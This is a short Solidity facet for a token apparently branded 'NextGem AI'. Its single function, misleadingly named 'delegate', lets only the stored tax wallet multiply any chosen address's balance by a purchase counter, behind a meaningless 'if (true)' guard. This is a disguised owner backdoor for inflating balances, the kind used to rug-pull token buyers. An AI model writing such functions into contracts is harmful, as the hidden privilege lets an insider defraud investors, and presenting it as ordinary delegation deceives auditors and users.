// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://thenextgem.ai/
    Twitter:  https://twitter.com/NextGemAI
    Discord:  https://discord.gg/rpPTF3DRFk
    Telegram: https://t.me/NextGemAI_Group

*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
